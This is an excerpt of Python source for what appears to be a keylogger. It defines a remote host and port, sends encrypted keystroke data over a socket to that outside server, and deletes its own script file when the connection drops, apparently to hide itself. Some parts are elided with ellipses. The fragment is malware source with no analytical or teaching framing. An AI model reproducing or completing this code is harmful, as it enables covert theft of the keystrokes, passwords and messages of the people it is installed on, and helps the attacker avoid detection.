...
HOST = "benjaminmalik.com" # remote host
PORT = 8975 #YK
...
def write_to_file(keystroke):
    ...
    if keystroke:
        try:
            ...
            SOCK.send(enc_data)
        except BrokenPipeError: # If the remote server goes down
            try:
                os.remove(__file__) # correct file
            except:
                try:
                    os.remove(sys.argv[0]) # command line
                except:
                    print('I died.')
            sys.exit()
        except ConnectionResetError: # if no internet for a while
